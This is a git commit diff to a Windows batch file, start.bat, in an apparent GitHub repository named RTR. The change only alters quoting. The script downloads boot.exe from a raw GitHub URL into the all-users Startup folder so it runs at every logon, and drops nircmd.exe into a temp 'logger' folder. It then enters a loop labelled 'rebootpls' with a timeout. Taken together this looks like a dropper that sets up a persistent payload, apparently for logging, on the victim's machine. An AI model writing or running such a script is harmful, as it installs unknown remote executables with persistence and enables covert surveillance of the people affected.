76dcad7fadf0c989f52ca19599d6871764beab08
TheBetaBiggie <53587460+TheBetaBiggie@users.noreply.github.com>
2022-08-24 03:04:28 -0700

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,5 +1,5 @@
 @echo off
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/boot.exe -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe"
+powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/boot.exe -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe'
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/nircmd.exe -OutFile %temp%\logger\nircmd.exe
 :rebootpls
 timeout 300
